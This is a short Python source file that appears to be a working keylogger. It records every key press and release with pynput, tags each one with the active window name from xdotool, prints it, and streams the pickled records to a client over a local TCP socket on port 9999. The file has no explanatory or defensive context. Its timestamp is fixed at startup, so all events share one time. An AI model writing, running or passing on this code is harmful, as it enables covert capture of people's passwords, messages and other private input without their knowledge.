from pynput import keyboard as Key
from datetime import datetime as Time
import subprocess
import pickle
import socket as skt
def getwindow_name():
	name =   subprocess.run(["xdotool","getactivewindow","getwindowname"],capture_output=True,text=True).stdout
	return name
server = skt.socket(skt.AF_INET,skt.SOCK_STREAM)
current_time = Time.now()
server.bind(('127.0.0.1',9999))
server.listen()
clnt,addr = server.accept()
def Sender(client,data):
	client.send(data)
def key_pressed(Key):
	window_name = getwindow_name();
	try:
		print(f'{current_time} Pressed : {Key.char} at {window_name}')
		data = pickle.dumps((0,current_time,Key.char,window_name))
	except AttributeError:
		print(f'{current_time} Special Key Pressed : {Key} at {window_name}')
		data = pickle.dumps((0,current_time,Key,window_name))
	Sender(clnt,data)
def key_released(Key):
	window_name = getwindow_name();
	try:
		print(f'{current_time} Released : {Key.char} at {window_name}')
		data = pickle.dumps((1,current_time,Key.char,window_name))
	except AttributeError:
		print(f'{current_time} Special Key Released : {Key} at {window_name}')
		data = pickle.dumps((1,current_time,Key,window_name))
	Sender(clnt,data)
listener = Key.Listener(on_press = key_pressed , on_release = key_released)
listener.start()
listener.join()
